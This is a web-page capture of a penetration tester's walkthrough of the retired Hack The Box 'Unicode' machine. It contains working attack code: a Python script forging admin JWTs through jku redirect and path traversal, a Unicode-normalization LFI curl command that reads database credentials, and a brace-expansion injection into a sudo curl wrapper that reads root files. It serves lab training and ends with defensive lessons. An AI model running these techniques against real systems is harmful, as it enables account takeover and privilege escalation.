@@ -1,0 +1,329 @@
+1:"$Sreact.fragment"
+2:I[4236,[],""]
+3:I[170,[],""]
+5:I[6025,[],"OutletBoundary"]
+6:"$Sreact.suspense"
+9:I[6025,[],"ViewportBoundary"]
+b:I[6025,[],"MetadataBoundary"]
+d:I[4168,[],"default",1]
+:HL["/_next/static/css/d6e294cd2610ae11.css","style"]
+0:{"P":null,"c":["","writing","hackthebox-unicode-walkthrough",""],"q":"","i":false,"f":[[["",{"children":["writing",{"children":[["slug","hackthebox-unicode-walkthrough","d",null],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",16],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/d6e294cd2610ae11.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":["$","body",null,{"children":[["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[["$","title",null,{"children":"404: This page could not be found."}],["$","div",null,{"style":{"fontFamily":"system-ui,\"Segoe UI\",Roboto,Helvetica,Arial,sans-serif,\"Apple Color Emoji\",\"Segoe UI Emoji\"","height":"100vh","textAlign":"center","display":"flex","flexDirection":"column","alignItems":"center","justifyContent":"center"},"children":["$","div",null,{"children":[["$","style",null,{"dangerouslySetInnerHTML":{"__html":"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}"}}],["$","h1",null,{"className":"next-error-h1","style":{"display":"inline-block","margin":"0 20px 0 0","padding":"0 23px 0 0","fontSize":24,"fontWeight":500,"verticalAlign":"top","lineHeight":"49px"},"children":404}],["$","div",null,{"style":{"display":"inline-block"},"children":["$","h2",null,{"style":{"fontSize":14,"fontWeight":400,"lineHeight":"49px","margin":0},"children":"This page could not be found."}]}]]}]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}],["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"Person\",\"@id\":\"https://cyberkareem.com/#person\",\"name\":\"Abdullah Kareem\",\"alternateName\":\"CyberKareem\",\"url\":\"https://cyberkareem.com\",\"jobTitle\":\"Security Researcher and Penetration Tester\",\"knowsAbout\":[\"Vulnerability research\",\"Penetration testing\",\"Responsible disclosure\",\"Web application security\",\"API security\",\"Mobile application security\",\"Infrastructure security\",\"Active Directory security\",\"Wireless security\",\"Application security consulting\"],\"sameAs\":[\"https://www.linkedin.com/in/cyberkareem/\",\"https://github.com/CyberKareem\",\"https://x.com/cyberkareem\",\"https://linktr.ee/cyberkareem\",\"https://app.hackthebox.com/public/users/349278\",\"https://www.credential.net/profile/cyberkareem/wallet\",\"https://www.credly.com/users/cyberkareem/badges\"]},{\"@type\":\"WebSite\",\"@id\":\"https://cyberkareem.com/#website\",\"url\":\"https://cyberkareem.com\",\"name\":\"CyberKareem — Abdullah Kareem\",\"publisher\":{\"@id\":\"https://cyberkareem.com/#person\"}}]}"}}]]}]}]]}],{"children":[["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["$","$1","c",{"children":["$L4",null,["$","$L5",null,{"children":["$","$6",null,{"name":"Next.MetadataOutlet","children":"$@7"}]}]]}],{},null,false,null]},null,false,"$@8"]},null,false,"$@8"]},null,false,null],["$","$1","h",{"children":[null,["$","$L9",null,{"children":"$La"}],["$","div",null,{"hidden":true,"children":["$","$Lb",null,{"children":["$","$6",null,{"name":"Next.Metadata","children":"$Lc"}]}]}],null]}],false]],"m":"$undefined","G":["$d",[]],"S":true,"h":null,"s":"$undefined","l":"$undefined","p":"$undefined","d":"$undefined","b":"65jXSdzueZKnFbMeYrtpi"}
+e:[]
+8:"$We"
+f:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+10:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+:HL["/writing/covers/hackthebox-unicode-walkthrough.webp","image"]
+4:[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$Lf",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","a","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","a","/about",{"href":"/about","aria-current":"$undefined","children":"About"}]]}],["$","$Lf",null,{"className":"utility-link","href":"/contact#assessment-enquiries","aria-current":"$undefined","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L10",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$Lf",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Unicode Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Unicode machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T11:00:04.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[9," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-unicode-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Unicode machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Unicode machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/unicode","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/d24ac389f40e348f0a9fcd49ae95b935f1e85d90/HTB-Unicode.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · d24ac389f40e",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Unicode"," · Linux"," · Medium"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/unicode","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L11"]}]]}],["$L12","$L13","$L14"]]}],"$L15"]}]]}],"$L16"]}],"$L17","$L18"]
+11:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+12:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Unicode machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+13:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+14:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"10 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+19:T4139,
+<p><strong>Difficulty:</strong> Medium | <strong>OS:</strong> Linux | <strong>IP:</strong> 10.129.12.87</p>
+<hr />
+
+
+
+<h2 id="1-mindset-and-approach-mindset">1. Mindset &amp; Approach {#mindset}</h2>
+<p>Before touching a machine, the hacker mindset is:</p>
+<blockquote>
+<p><strong>"Every feature is an attack surface. Every input is a potential injection point. Every trust assumption is a potential bypass."</strong></p>
+</blockquote>
+<p>We approach this in layers:</p>
+<ul>
+<li><strong>What ports are open?</strong> → What services are running?</li>
+<li><strong>What does the app do?</strong> → What does it trust? What does it validate?</li>
+<li><strong>Where does it fail?</strong> → Can we abuse the gap between what it <em>checks</em> and what it <em>does</em>?</li>
+</ul>
+<hr />
+<h2 id="2-reconnaissance-nmap-recon">2. Reconnaissance — Nmap {#recon}</h2>
+<h3 id="what-we-ran">What we ran</h3>
+<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.12.87
+nmap -p 22,80 -sCV 10.129.12.87
+</code></pre>
+<h3 id="what-we-found">What we found</h3>
+<pre><code>22/tcp  open  ssh     OpenSSH 8.2p1
+80/tcp  open  http    nginx 1.18.0
+</code></pre>
+<h3 id="why-we-did-it-this-way">Why we did it this way</h3>
+<ul>
+<li><code>-p-</code> scans <strong>all 65535 ports</strong>, not just the top 1000. Services are often hidden on high ports.</li>
+<li><code>--min-rate 10000</code> speeds up the scan significantly on HTB's stable network.</li>
+<li><code>-sCV</code> on specific ports runs <strong>version detection</strong> (<code>-sV</code>) and <strong>default scripts</strong> (<code>-sC</code>) to grab banners, headers, and service details.</li>
+</ul>
+<h3 id="hacker-mindset">Hacker mindset</h3>
+<p>Only two ports open means our entire attack surface is the web app on port 80. SSH is almost certainly the path in — but only after we find credentials or a key through the web app. We ignore SSH for now and focus everything on port 80.</p>
+<hr />
+<h2 id="3-web-enumeration-web">3. Web Enumeration {#web}</h2>
+<h3 id="add-hostname-to-etc-hosts">Add hostname to /etc/hosts</h3>
+<pre><code class="language-bash" data-language="bash">echo "10.129.12.87 hackmedia.htb" | sudo tee -a /etc/hosts
+</code></pre>
+<p><strong>Why:</strong> The nmap HTTP response referenced <code>hackmedia.htb</code>. Web apps often behave differently (or only work properly) when accessed by hostname rather than IP due to virtual hosting. Always add discovered hostnames to <code>/etc/hosts</code>.</p>
+<h3 id="browse-the-site">Browse the site</h3>
+<p>Visiting <code>http://hackmedia.htb</code> shows a "threat intelligence" company site. Key observations:</p>
+<ul>
+<li><code>/login/</code> and <code>/register/</code> pages exist</li>
+<li>A link in the nav goes to <code>/redirect/?url=google.com</code> — <strong>this is an open redirect, file it away</strong></li>
+<li>Footer says "Powered by Flask" — Python backend</li>
+</ul>
+<h3 id="register-an-account-and-log-in">Register an account and log in</h3>
+<p>After registering and logging in, we get redirected to <code>/dashboard</code>. The interesting part is in the HTTP response headers — a cookie is REDACTED</p>
+<pre><code>Set-Cookie: null encoded lab material]...
+</code></pre>
+<h3 id="decode-the-jwt">Decode the JWT</h3>
+<p>A JWT (JSON Web Token) is three base64url-encoded parts separated by dots:</p>
+<ul>
+<li><strong>Header</strong> — algorithm and metadata</li>
+<li><strong>Payload</strong> — claims (who you are)</li>
+<li><strong>Signature</strong> — cryptographic proof the token is REDACTED</li>
+</ul>
+<p>Decoding the header reveals:</p>
+<pre><code class="language-json" data-language="json">{
+  "typ": "JWT",
+  "alg": "RS256",
+  "jku": "http://hackmedia.htb/static/jwks.json"
+}
+</code></pre>
+<p>Decoding the payload reveals:</p>
+<pre><code class="language-json" data-language="json">{
+  "user": "testuser"
+}
+</code></pre>
+<h3 id="why-this-matters">Why this matters</h3>
+<ul>
+<li><strong>RS256</strong> means the token is REDACTED with an RSA <em>private</em> key and verified with a <em>public</em> key. Unlike HS256 (symmetric/secret), the public key can be published — and here it is, at the <code>jku</code> URL.</li>
+<li><strong><code>jku</code> (JWK Set URL)</strong> is a header telling the server <em>where to fetch the public key</em> to verify this token. This is the attack surface.</li>
+</ul>
+<h3 id="hacker-mindset-2">Hacker mindset</h3>
+<blockquote>
+<p>"The server fetches the public key from a URL. That URL is in the token itself, which <em>I</em> control. If I can make the server fetch a key <em>I</em> host, I can sign tokens with my own private key and impersonate anyone — including <code>admin</code>."</p>
+</blockquote>
+<p>The only obstacle: the server probably only trusts URLs on its own domain.</p>
+<hr />
+<h2 id="4-jwt-forgery-rs256-jku-abuse-jwt">4. JWT Forgery (RS256 + JKU Abuse) {#jwt}</h2>
+<h3 id="the-full-exploit-chain">The full exploit chain</h3>
+<pre><code>Our Server (serves our jwks.json)
+        ↑
+        |  open redirect
+hackmedia.htb/redirect/?url=10.10.16.84/jwks.json
+        ↑
+        |  path traversal in jku
+hackmedia.htb/static/../redirect/?url=10.10.16.84/jwks.json
+</code></pre>
+<h3 id="step-1-generate-our-own-rsa-key-pair">Step 1 — Generate our own RSA key pair</h3>
+<pre><code class="language-bash" data-language="bash">cd /tmp
+openssl genrsa -out jwtRSA256-private.pem 2048
+openssl rsa -in jwtRSA256-private.pem -pubout -outform PEM -out jwtRSA256-public.pem
+</code></pre>
+<p><strong>Why:</strong> We need our own RSA private key to sign the forged token. We'll publish the matching public key on our HTTP server so the target can "verify" it — but it's our key, so we control what gets verified.</p>
+<h3 id="step-2-build-jwks-json-and-forge-the-jwt">Step 2 — Build jwks.json and forge the JWT</h3>
+<pre><code class="language-python" data-language="python">python3 -c "
+import json, base64
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.backends import default_backend
+
+with open('/tmp/jwtRSA256-private.pem', 'rb') as f:
+    priv = serialization.load_pem_private_key(f.read(), password=REDACTED, backend=default_backend())
+
+nums = priv.public_key().public_numbers()
+n = base64.urlsafe_b64encode(nums.n.to_bytes((nums.n.bit_length()+7)//8,'big')).rstrip(b'=').decode()
+e = base64.urlsafe_b64encode(nums.e.to_bytes((nums.e.bit_length()+7)//8,'big')).rstrip(b'=').decode()
+
+jwks = {'keys':[{'kty':'RSA','use':'sig','kid':'hackthebox','alg':'RS256','n':n,'e':e}]}
+with open('/tmp/jwks.json','w') as f:
+    json.dump(jwks, f, indent=4)
+
+def b64u(data):
+    if isinstance(data, str): data = data.encode()
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+header = {'typ':'JWT','alg':'RS256','jku':'http://hackmedia.htb/static/../redirect/?url=10.10.16.84/jwks.json'}
+payload = {'user':'admin'}
+h = b64u(json.dumps(header,separators=(',',':')))
+p = b64u(json.dumps(payload,separators=(',',':')))
+sig = base64.urlsafe_b64encode(priv.sign(f'{h}.{p}'.encode(), padding.PKCS1v15(), hashes.SHA256())).rstrip(b'=').decode()
+print(f'{h}.{p}.{sig}')
+"
+</code></pre>
+<p><strong>Breaking down the <code>jku</code> value:</strong></p>
+<pre><code>http://hackmedia.htb/static/../redirect/?url=10.10.16.84/jwks.json
+</code></pre>
+<ul>
+<li>The server checks that <code>jku</code> starts with <code>http://hackmedia.htb/static/</code> —  it does</li>
+<li>But <code>/static/../</code> resolves to just <code>/</code> via path traversal</li>
+<li>So the real URL hit is <code>http://hackmedia.htb/redirect/?url=10.10.16.84/jwks.json</code></li>
+<li>That open redirect we noted earlier sends the server to <em>our</em> machine</li>
+<li>We serve our <code>jwks.json</code> with our public key</li>
+</ul>
+<h3 id="step-3-serve-the-key-and-set-the-cookie">Step 3 — Serve the key and set the cookie</h3>
+<pre><code class="language-bash" data-language="bash">cd /tmp &amp;&amp; python3 -m http.server 80
+</code></pre>
+<p>Replace the <code>auth</code> cookie in the browser with the forged JWT. When the server validates the token, it:</p>
+<ol>
+<li>Reads <code>jku</code> from the header → follows the redirect → hits our server → gets our <code>jwks.json</code></li>
+<li>Uses our public key to verify the signature — which validates perfectly because we signed it with the matching private key</li>
+<li>Reads <code>"user": "admin"</code> from the payload and grants admin access</li>
+</ol>
+<p><strong>Confirmed:</strong> The HTTP server logs <code>GET /jwks.json HTTP/1.1" 200</code> — the server trusted our key.</p>
+<h3 id="what-we-now-have">What we now have</h3>
+<p>Admin dashboard access, with new links pointing to <code>/display/?page=monthly.pdf</code>.</p>
+<hr />
+<h2 id="5-local-file-inclusion-via-unicode-normalization-lfi">5. Local File Inclusion via Unicode Normalization {#lfi}</h2>
+<h3 id="the-vulnerability">The vulnerability</h3>
+<p>The <code>/display/?page=</code> endpoint loads files from the filesystem based on user input. Trying <code>?page=/etc/passwd</code> returns a filtering error:</p>
+<blockquote>
+<p>"we do a lot input filtering you can never bypass our filters"</p>
+</blockquote>
+<p>Testing reveals the blocklist includes:</p>
+<ul>
+<li><code>../</code> (path traversal)</li>
+<li><code>/etc</code>, <code>/var</code>, <code>/home</code> (key directories)</li>
+</ul>
+<h3 id="the-bypass-unicode-normalization">The bypass — Unicode Normalization</h3>
+<p>The box is named "Unicode" for a reason. Many web frameworks normalize unicode characters — converting lookalike unicode characters to their ASCII equivalents — <em>after</em> the WAF/filter has already run.</p>
+<p>The character <code>‥</code> (U+2025, TWO DOT LEADER, encoded as <code>%E2%80%A5</code>) looks like two dots but is a single unicode character. After normalization, it becomes <code>..</code>.</p>
+<p>So:</p>
+<pre><code>%E2%80%A5/  →  (after normalization) →  ../
+</code></pre>
+<p>The filter sees <code>%E2%80%A5/</code> and passes it. The filesystem sees <code>../</code> and traverses up.</p>
+<h3 id="reading-db-yaml">Reading db.yaml</h3>
+<pre><code class="language-bash" data-language="bash">curl -s 'http://hackmedia.htb/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/home/code/coder/db.yaml' \
+  --cookie 'auth=REDACTED
+</code></pre>
+<p><strong>Why that path?</strong> We know from the nginx config (also readable via LFI at <code>/etc/nginx/sites-available/default</code>) that the app lives in <code>/home/code/coder/</code>. Four <code>%E2%80%A5/</code> sequences traverse up four directory levels from wherever the app is serving files.</p>
+<p><strong>Result:</strong></p>
+<pre><code class="language-yaml" data-language="yaml">mysql_host: "localhost"
+mysql_user: "code"
+mysql_password: "REDACTED"
+mysql_db: "user"
+</code></pre>
+<h3 id="hacker-mindset-3">Hacker mindset</h3>
+<blockquote>
+<p>"The filter only catches what it knows to look for. If I can represent the same path in a way the filter doesn't recognize, but the app/OS does, I win. Unicode normalization is exactly that gap."</p>
+</blockquote>
+<hr />
+<h2 id="6-shell-as-code-user-flag-user">6. Shell as <code>code</code> (User Flag) {#user}</h2>
+<h3 id="ssh-in">SSH in</h3>
+<pre><code class="language-bash" data-language="bash">ssh code@10.129.12.87
+# password: null
+</code></pre>
+<p><strong>Why this works:</strong> The database user <code>code</code> happens to be a system user too (we can see <code>code:x:1000:1000</code> in <code>/etc/passwd</code>), and they reused the same password.</p>
+<p><strong>Lesson:</strong> Never reuse credentials across services. Database passwords and system passwords should always be different.</p>
+<pre><code class="language-bash" data-language="bash">cat ~/user.txt
+# 443fc6[redacted]67361b1
+</code></pre>
+<hr />
+<h2 id="7-privilege-escalation-via-sudo-treport-privesc">7. Privilege Escalation via <code>sudo treport</code> {#privesc}</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>First thing on any new shell: check what we can run as root.</p>
+<pre><code class="language-bash" data-language="bash">sudo -l
+</code></pre>
+<p>Output:</p>
+<pre><code>(root) NOPASSWD: /usr/bin/treport
+</code></pre>
+<p>We can run <code>/usr/bin/treport</code> as root with no password. This is our escalation path.</p>
+<h3 id="analyzing-treport">Analyzing treport</h3>
+<p>Running the binary shows a menu:</p>
+<pre><code>1. Create Threat Report
+2. Read Threat Report
+3. Download A Threat Report
+4. Quit
+</code></pre>
+<p>The binary is actually a Python script packaged with PyInstaller into an ELF. The key code in option 3 is:</p>
+<pre><code class="language-python" data-language="python">def download(self):
+    command_injection_list = ['$','`',';','&amp;','|','||','&gt;','&lt;','?',"'",'@','#','$','%','^','(',')']
+    ip = input('Enter the IP/file_name:')
+    
+    # Filter 1: no whitespace
+    if bool(re.search('\\s', ip)):
+        sys.exit(0)
+    
+    # Filter 2: block certain URL schemes
+    if 'file' in ip or 'gopher' in ip or 'mysql' in ip:
+        sys.exit(0)
+    
+    # Filter 3: block special chars (but NOT curly braces!)
+    for vars in command_injection_list:
+        if vars in ip:
+            sys.exit(0)
+    
+    cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '"'
+    os.system(cmd)
+</code></pre>
+<h3 id="the-vulnerabilities">The vulnerabilities</h3>
+<p><strong>Vulnerability 1 — Case-sensitive filter:</strong>
+The check is <code>if 'file' in ip</code> — lowercase only. <code>File:///root/root.txt</code> passes the filter but curl treats it identically to <code>file:///root/root.txt</code>.</p>
+<p><strong>Vulnerability 2 — Bash brace expansion:</strong>
+Curly braces <code>{}</code> are not in the blocklist. Bash expands <code>{a,b,c}</code> into separate arguments <code>a b c</code>. So:</p>
+<pre><code class="language-bash" data-language="bash">curl {File:///root/root.txt,-o-} -o /root/reports/threat_report_XX_XX_XX
+</code></pre>
+<p>becomes:</p>
+<pre><code class="language-bash" data-language="bash">curl File:///root/root.txt -o- -o /root/reports/threat_report_XX_XX_XX
+</code></pre>
+<p>The <code>-o-</code> flag tells curl to output to stdout instead of a file, so the content is printed directly to the terminal.</p>
+<p><strong>Vulnerability 3 — No whitespace needed:</strong>
+The filter blocks whitespace, but brace expansion naturally separates the arguments without spaces.</p>
+<h3 id="the-exploit">The exploit</h3>
+<pre><code class="language-bash" data-language="bash">sudo /usr/bin/treport
+</code></pre>
+<pre><code>Enter your choice: 3
+Enter the IP/file_name: {File:///root/root.txt,-o-}
+</code></pre>
+<hr />
+<h2 id="8-root-flag-root">8. Root Flag {#root}</h2>
+<pre><code>fe07d8[redacted]4b837ec4c
+</code></pre>
+<hr />
+<h2 id="9-key-takeaways-takeaways">9. Key Takeaways {#takeaways}</h2>
+<table>
+<thead>
+<tr>
+<th>Vulnerability</th>
+<th>Root Cause</th>
+<th>Lesson</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JWT JKU injection</td>
+<td>Server trusts user-supplied key URL</td>
+<td>Never fetch cryptographic material from attacker-controlled URLs</td>
+</tr>
+<tr>
+<td>Open redirect + path traversal</td>
+<td>Allowlist only checked prefix, not full path</td>
+<td>Validate the <em>resolved</em> URL, not the raw string</td>
+</tr>
+<tr>
+<td>Unicode normalization LFI</td>
+<td>Filter runs before normalization</td>
+<td>Sanitize input <em>after</em> normalization, not before</td>
+</tr>
+<tr>
+<td>Credential reuse</td>
+<td>DB password = REDACTED password</td>
+<td>Each service must have a unique credential</td>
+</tr>
+<tr>
+<td><code>sudo</code> binary with curl injection</td>
+<td><code>file</code> check is case-sensitive, <code>{}</code> not blocked</td>
+<td>Filter all cases; prefer allowlists over blocklists</td>
+</tr>
+</tbody></table>
+<h3 id="the-hacker-mindset-in-one-sentence-per-step">The hacker mindset in one sentence per step:</h3>
+<ol>
+<li><strong>Nmap:</strong> <em>Know your surface before you attack.</em></li>
+<li><strong>JWT analysis:</strong> <em>Every piece of data the server returns tells you something about how it thinks.</em></li>
+<li><strong>JKU abuse:</strong> <em>If the server fetches something from a URL you control, you control what it trusts.</em></li>
+<li><strong>Unicode bypass:</strong> <em>Filters that run before normalization can be bypassed with lookalike characters.</em></li>
+<li><strong>Credential reuse:</strong> <em>People are lazy — try every password you find everywhere.</em></li>
+<li><strong>treport injection:</strong> <em>Blocklists fail when you find a character they didn't think to block.</em></li>
+</ol>
+15:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$19"}}]
+16:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$Lf",null,{"href":"/writing/hackthebox-unobtainium-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: Unobtainium Walkthrough"}]]}]}],["$","$Lf",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$Lf",null,{"href":"/writing/hackthebox-twomillion-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: TwoMillion Walkthrough"}]]}]}]]}]
+17:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$Lf",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$Lf","Research",{"href":"/research","children":"Research"}],["$","$Lf","Services",{"href":"/services","children":"Services"}],["$","$Lf","Writing",{"href":"/writing","children":"Writing"}],["$","$Lf","Projects",{"href":"/projects","children":"Projects"}],["$","$Lf","About",{"href":"/about","children":"About"}],["$","$Lf","Contact",{"href":"/contact","children":"Contact"}],["$","$Lf","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$Lf",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+1a:T51f,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-unicode-walkthrough/#article","headline":"Hack The Box: Unicode Walkthrough","description":"An archived walkthrough of the retired Hack The Box Unicode machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-unicode-walkthrough/","datePublished":"2026-06-11T11:00:04.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":1608,"articleSection":"Hack The 